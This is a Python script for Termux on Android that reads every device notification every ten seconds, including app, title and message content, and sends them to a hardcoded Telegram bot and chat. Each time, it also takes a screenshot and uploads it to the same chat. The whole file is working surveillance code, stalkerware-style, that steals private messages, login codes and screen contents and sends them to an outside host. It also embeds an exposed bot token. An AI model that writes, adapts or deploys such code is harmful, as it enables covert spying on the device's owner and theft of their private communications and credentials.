import subprocess
import json
import time
import requests
import os

# Telegram bot details
TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
CHAT_ID = "5928551879"

def send_telegram_message(message):
    params = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.get(TELEGRAM_API_URL, params=params)
    return response.json()

def send_telegram_photo(photo_path, caption=""):
    with open(photo_path, 'rb') as photo:
        params = {
            'chat_id': CHAT_ID,
            'caption': caption
        }
        files = {'photo': photo}
        response = requests.post(f"https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendPhoto", params=params, files=files)
        return response.json()

def get_notifications():
    try:
        # Capture notifications using termux-notification-list
        notifications_raw = subprocess.check_output("termux-notification-list", shell=True, stderr=subprocess.PIPE)
        notifications = json.loads(notifications_raw.decode('utf-8'))
        return notifications
    except Exception as e:
        print(f"Error fetching notifications: {e}")
        return None

def capture_screenshot():
    try:
        # Capture screenshot using termux-screenshot
        screenshot_path = "/data/data/com.termux/files/home/screenshot.png"
        subprocess.run("termux-screenshot -e", shell=True, stderr=subprocess.PIPE)
        # Move screenshot to a readable location
        if os.path.exists(screenshot_path):
            return screenshot_path
        else:
            return None
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None

def parse_notifications(notifications):
    parsed_messages = []
    for notification in notifications:
        app = notification.get("packageName", "Unknown App")
        title = notification.get("title", "No Title")
        content = notification.get("content", "No Content")
        when = notification.get("when", "Unknown Time")
        parsed_messages.append(f"App: {app}\nTitle: {title}\nContent: {content}\nTime: {when}")
    return "\n\n".join(parsed_messages)

def main():
    while True:
        notifications = get_notifications()
        if notifications:
            message = parse_notifications(notifications)
            send_telegram_message(f"Notifications:\n\n{message}")
            
            # Capture screenshot and send it
            screenshot_path = capture_screenshot()
            if screenshot_path:
                send_telegram_photo(screenshot_path, caption="Here is the screenshot!")
            
        time.sleep(10)  # Wait for 10 seconds before checking again

if __name__ == "__main__":
    main()
